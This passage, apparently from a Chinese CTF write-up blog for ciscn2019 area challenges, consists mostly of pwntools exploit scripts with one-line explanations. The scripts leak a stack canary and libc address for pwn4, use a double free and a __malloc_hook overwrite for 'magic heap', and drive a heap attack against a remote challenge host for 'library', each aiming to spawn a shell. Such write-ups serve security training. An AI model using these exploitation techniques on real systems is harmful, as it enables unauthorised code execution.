class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">num = <span class="built_in">int</span>(rud(<span class="string">&quot;  &quot;</span>),<span class="number">10</span>)</span><br><span class="line"><span class="keyword">if</span> num!=<span class="number">1</span>:</span><br><span class="line">res.append(num)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> res</span><br><span class="line">num1 = <span class="number">0</span></span><br><span class="line">num2 = <span class="number">0</span></span><br><span class="line">num1 = res[<span class="number">0</span>]</span><br><span class="line">num2 = res[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> num1&lt;<span class="number">0</span>:</span><br><span class="line">num1 = num1+<span class="number">0x100000000</span></span><br><span class="line"><span class="keyword">if</span> num2&lt;<span class="number">0</span>:</span><br><span class="line">num2 = num2+<span class="number">0x100000000</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(num1)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(num2)</span><br><span class="line"></span><br><span class="line">canary =<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">hex</span>(num1).endswith(<span class="string">&quot;00&quot;</span>):</span><br><span class="line">canary = num1+(num2&lt;&lt;<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">hex</span>(num2).endswith(<span class="string">&quot;00&quot;</span>):</span><br><span class="line">canary = num2+(num1&lt;&lt;<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(canary)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;you can change your girlfriend\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;which girlfriend do you want to change?&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">27</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(canary&amp;<span class="number">0xffffffff</span>))</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>((canary&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0x400d93</span>))</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0x00</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0x00</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0x00</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0x400895</span>))</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0x00</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0x0</span>))</span><br><span class="line"></span><br><span class="line">libc.address = u64(rn(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>)) -<span class="number">0x6f690</span></span><br><span class="line">log.info(<span class="string">&#x27;libc.address:&#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;system:&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&#x27;binsh:&#x27;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;how many girlfriends do you have?\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">ru(<span class="string">&quot;girlfriends:&quot;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="string">&quot;1&quot;</span>))</span><br><span class="line">ru(<span class="string">&quot;girlfriends:&quot;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="string">&quot;+&quot;</span>))</span><br><span class="line">ru(<span class="string">&quot;girlfriends:&quot;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="string">&quot;+&quot;</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;this is the sort result:&#x27;</span>)</span><br><span class="line">res = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">num = <span class="built_in">int</span>(rud(<span class="string">&quot;  &quot;</span>),<span class="number">10</span>)</span><br><span class="line"><span class="keyword">if</span> num!=<span class="number">1</span>:</span><br><span class="line">res.append(num)</span><br><span class="line"><span class="built_in">print</span> res</span><br><span class="line">num1 = <span class="number">0</span></span><br><span class="line">num2 = <span class="number">0</span></span><br><span class="line">num1 = res[<span class="number">0</span>]</span><br><span class="line">num2 = res[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> num1&lt;<span class="number">0</span>:</span><br><span class="line">num1 = num1+<span class="number">0x100000000</span></span><br><span class="line"><span class="keyword">if</span> num2&lt;<span class="number">0</span>:</span><br><span class="line">num2 = num2+<span class="number">0x100000000</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(num1)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(num2)</span><br><span class="line"></span><br><span class="line">canary =<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">hex</span>(num1).endswith(<span class="string">&quot;00&quot;</span>):</span><br><span class="line">canary = num1+(num2&lt;&lt;<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">hex</span>(num2).endswith(<span class="string">&quot;00&quot;</span>):</span><br><span class="line">canary = num2+(num1&lt;&lt;<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(canary)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;you can change your girlfriend\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;which girlfriend do you want to change?&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">27</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(canary&amp;<span class="number">0xffffffff</span>))</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>((canary&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0x400d93</span>))</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0x00</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(binsh&amp;<span class="number">0xffffffff</span>))</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>((binsh&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(system&amp;<span class="number">0xffffffff</span>))</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>((system&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0x400895</span>))</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0x00</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">ru(<span class="string">&#x27;now change:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">0x0</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">context.binary = <span class="string">&#x27;./pwn4&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;115&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">1</span>:</span><br><span class="line">io = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">exploit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = process(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">exploit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h3 id="pwn5-magic-heap-✅"><a href="#pwn5-magic-heap-✅" class="headerlink" title="pwn5-magic heap ✅"></a>pwn5-magic heap ✅</h3><p>没有泄露，但是在<code>delete</code>函数中可以造成double free 通过修改topchunk，写入<code>__malloc_hook</code>进而Getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/env/bin python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">rld = <span class="keyword">lambda</span>: io.recvline(keepends = <span class="literal">False</span>)</span><br><span class="line">rufd = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">False</span>)</span><br><span class="line">rud = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">rl = <span class="keyword">lambda</span> :io.recvline()</span><br><span class="line">se = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sel = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sea = <span class="keyword">lambda</span> x:io.sendafter(x)</span><br><span class="line">sela = <span class="keyword">lambda</span> x:io.sendlineafter(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">ru(<span class="string">&#x27;Input your choice:&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">ru(<span class="string">&quot;Please input the size of story: \n&quot;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(size))</span><br><span class="line">ru(<span class="string">&#x27;please inpute the story: &#x27;</span>)</span><br><span class="line">se(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">ru(<span class="string">&#x27;Input your choice:&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">ru(<span class="string">&#x27;Please input the index:\n&#x27;</span>)</span><br><span class="line">sel(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">order=[]</span>):</span><br><span class="line">command = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> order:</span><br><span class="line">command += <span class="built_in">str</span>(item)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">log.info(<span class="string">&#x27;gdb command:\n&#x27;</span>+command)</span><br><span class="line">gdb.attach(io,command)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">flag</span>):</span><br><span class="line">ru(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">se(<span class="string">&#x27;8&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">ru(<span class="string">&quot;Please input your ID.&quot;</span>)</span><br><span class="line">se(<span class="string">&#x27;1&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">ru(<span class="string">&#x27;1&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">libc.address = u64(rn(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x78439</span></span><br><span class="line">log.info(<span class="string">&#x27;libc.address:&#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">__malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;__malloc_hook:&#x27;</span>+<span class="built_in">hex</span>(__malloc_hook))</span><br><span class="line">one = libc.address+<span class="number">0xf02a4</span></span><br><span class="line">log.info(<span class="string">&#x27;one:&#x27;</span>+<span class="built_in">hex</span>(one))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x38</span>,p64(<span class="number">0x51</span>))</span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;3&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">&#x27;4&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">&#x27;5&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">&#x27;6&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x48</span>,p64(libc.address+<span class="number">0x3c4b30</span>))</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># z([&#x27;b *&#x27;+hex(proc_base+0xE88)])</span></span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x48</span>,<span class="number">7</span>*p64(<span class="number">0</span>)+p64(__malloc_hook-<span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x13</span>+p64(one))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">context.binary = <span class="string">&#x27;./magicheap&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;115&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./magicheap&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">1</span>:</span><br><span class="line">io = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">exploit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = process(<span class="string">&#x27;./magicheap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> io.libs()</span><br><span class="line">proc_base = io.libs()[<span class="string">&#x27;/ctf/work/CTFPro/2019/ciscn2019-area/PWN/magicheap/magicheap&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;proc_base:&#x27;</span>+<span class="built_in">hex</span>(proc_base))</span><br><span class="line">libc_base= io.libs()[<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">exploit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h3 id="pwn6-library-✅"><a href="#pwn6-library-✅" class="headerlink" title="pwn6-library ✅"></a>pwn6-library ✅</h3><p>不解释</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p=process([&#x27;./library-p1&#x27;],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line">p = remote(<span class="string">&quot;172.29.41.115&quot;</span>, <span class="number">8888</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal</span>(<span class="params">cipher</span>):</span><br><span class="line">      key=[<span class="number">61</span>, <span class="number">73</span>, <span class="number">83</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">113</span>, <span class="number">127</span>, <span class="number">131</span>, <span class="number">137</span>, <span class="number">139</span>, <span class="number">149</span>, <span class="number">151</span>, <span class="number">167</span>, <span class="number">179</span>, <span class="number">193</span>, <span class="number">199</span>, <span class="number">211</span>, <span class="number">223</span>, <span class="number">229</span>]</span><br><span class="line">      keyposs=[[] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xa3</span>):</span><br><span class="line">              ciphermid=cipher+(i&lt;&lt;<span class="number">32</span>)</span><br><span class="line">              <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                      <span class="keyword">for</span> k <span class="keyword">in</span> key:</span><br><span class="line">                              <span class="keyword">if</span> ciphermid % k == <span class="number">0</span>:</span><br><span class="line">                                      ciphermid=ciphermid//k</span><br><span class="line">                                      <span class="keyword">break</span></span><br><span class="line">              <span class="keyword">if</span> ciphermid <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>,<span class="number">263</span>):</span><br><span class="line">                      cipher=ciphermid</span><br><span class="line">                      <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">a,b</span>):</span><br><span class="line">  p.writeline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  p.readuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">  p.writeline(<span class="built_in">str</span>(a))</span><br><span class="line">  p.readuntil(<span class="string">&#x27;the book:&#x27;</span>)</span><br><span class="line">  p.writeline(b)</span><br><span class="line">  p.readuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">a</span>):</span><br><span class="line">  p.writeline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">  p.readuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">  p.writeline(<span class="built_in">str</span>(a))</span><br><span class="line">  p.readuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">a,b</span>):</span><br><span class="line">  p.writeline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">  p.readuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">  p.writeline(<span class="built_in">str</span>(a))</span><br><span class="line">  p.readuntil(<span class="string">&#x27;new name of the book:&#x27;</span>)</span><br><span class="line">  p.writeline(b)</span><br><span class="line">  p.readuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">  cipher=p.recv()[:-<span class="number">1</span>]</span><br><span class="line">  cipher=<span class="built_in">int</span>(cipher,<span class="number">16</span>)</span><br><span class="line">  password=cal(cipher)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(password))</span><br><span class="line">p.readuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">new(<span class="number">1</span>,p64(<span class="number">0x31</span>)*<span class="number">3</span>+<span class="built_in">chr</span>(<span class="number">0x31</span>))</span><br><span class="line">new(<span class="number">2</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">new(<span class="number">3</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">new(<span class="number">4</span>,p64(<span class="number">0x31</span>)*<span class="number">3</span>)</span><br><span class="line">new(<span class="number">5</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">new(<span class="number">6</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">new(<span class="number">7</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span 